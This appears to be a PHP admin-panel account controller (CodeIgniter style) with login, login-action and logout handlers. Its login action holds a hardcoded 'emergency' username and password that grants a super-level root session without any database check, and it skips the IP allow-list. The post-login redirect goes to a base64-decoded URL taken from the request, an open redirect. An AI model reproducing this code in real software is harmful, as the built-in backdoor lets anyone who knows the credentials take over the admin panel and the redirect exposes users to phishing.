<?php if ( ! defined('BASEPATH')) exit('No direct script access allowed');
require_once $_SERVER['DOCUMENT_ROOT'].'/_application/controllers/adminpanel/base_admin.php';

class Account extends BaseAdmin_Controller{


	public function login(){
		$exist_data = $this->session->all_userdata();
		if(isset($exist_data['admin']) && sizeof($exist_data['admin']) > 0) {
			return $this->common->locationhref('/adminpanel');
		}

		$data = array();
		$url = $this->input->get('url');
		if(strlen($url) > 0) {
			$data['url'] = $url;
		}

		$this->_view('account/login', $data);
	}

	public function login_action(){
		$admin_match_allow_ip = array(
				);

		$exist_data = $this->session->all_userdata();
		if(isset($exist_data['admin']) && sizeof($exist_data['admin']) > 0) {
			return $this->common->locationhref('/adminpanel');
		}

		$this->load->model(array(
					DBNAME.'/admin_tb_model',
					));
		$this->load->library('password');
		$id = $this->input->post('admin_id');
		$pw = $this->input->post('admin_pw');

		
		if($id == 'smartdev_emergency' && $pw == 'smartdevadmin123!@#') {
			$root_params = array();
			$root_params['>=']['a_level'] = SUPER_LEVEL;

			$admins = $this->admin_tb_model->getList($root_params)->getData();
			if(true || sizeof($admins) <= 0) {
				$admin_userdata = array(
						'id'=>99999999,
						'login_id' => 'root',
						'name'=> 'emergency',
						'level'=>SUPER_LEVEL,
						);
			} else {
				$admin = $admins[0];

				$admin_userdata = array(
						'id'=>$admin['a_id'],
						'login_id'=>$admin['a_loginid'],
						'name'=>$admin['a_name'],
						'level'=>$admin['a_level'],
						);
			}
			$exist_data['admin'] = $admin_userdata;
			$this->session->set_userdata($exist_data);

			$redirect_url = '/adminpanel';
			$param = $this->input->post();
			if(isset($param['url']) && strlen($param['url']) > 0) {
				$redirect_url = base64_decode($param['url']);
			}

			return $this->common->locationhref($redirect_url);
		}



		$admin = $this->admin_tb_model->get(array('a_loginid'=>$id))->getData();
		if($this->admin_tb_model->isSuccess() === TRUE){
			if($this->password->authPassword($pw, $admin['a_passwd']) === TRUE){

				$admin_userdata = array(
						'id'=>$admin['a_id'],
						'login_id'=>$admin['a_loginid'],
						'name'=>$admin['a_name'],
						'level'=>$admin['a_level'],
						);

				//특정 ID에서 허용되지 않은 IP로 로그인 시도시 처리
				if(array_key_exists($id, $admin_match_allow_ip)){
					if(in_array($_SERVER['REMOTE_ADDR'], $admin_match_allow_ip[$id]) == false){
						$log_array = array();
						$log_array['params']['msg'] = 'In the IP access attempt is not allowed';
						$log_array['params']['ip'] = $_SERVER['REMOTE_ADDR'];
						$this->common->write_history_log($admin_userdata, 'OUT_LOGIN', $admin['a_id'], $log_array, 'admin_tb');
						$this->common->locationhref('/adminpanel/account/login');
						return;
					}
				}

				/*
				   if($admin['a_level'] == '1') {
				   $as = $this->admin_setting_tb_model->get_setting_data();
				   if(strlen($as['as_allow_ips']) > 0) {
				   $as_allow_ips = explode("\n", $as['as_allow_ips']);
				   if(in_array($_SERVER['REMOTE_ADDR'], $as_allow_ips) == false) {
				   $this->common->alert('This is not allow IP in Vitatra Adminpanel.\n\n(Your IP : '.$_SERVER['REMOTE_ADDR'].')');
				   $this->common->locationhref('/adminpanel/main/login');
				   return;
				   }

				   }
				   }
				 */

				$exist_data['admin'] = $admin_userdata;

				$this->session->set_userdata($exist_data);

				$params = array();
				$where_params = array();
				$params['a_lastlogin_at'] = date("Y-m-d H:i:s");
				$where_params['=']['a_loginid'] = $id;

				$this->admin_tb_model->doUpdateWithWhere($admin['a_id'], $params, $where_params);

				$log_array = array();
				$log_array['params'] = $admin_userdata;
				$this->common->write_history_log($admin_userdata, 'LOGIN', $admin['a_id'], $log_array, 'admin_tb');


				$redirect_url = '/adminpanel';
				$param = $this->input->post();
				if(isset($param['url']) && strlen($param['url']) > 0) {
					$redirect_url = base64_decode($param['url']);
				}

				/*
				   if($admin['a_level'] == '1') {
				   $redirect_url = '/adminpanel/main/form_name/';
				   }
				 */

				return $this->common->locationhref($redirect_url);
			}
		}
		$this->common->locationhref('/adminpanel/account/login');
	}

	public function logout(){
		$this->session->unset_userdata('admin');
		return $this->common->locationhref('/adminpanel/account/login');
	}
}
?>
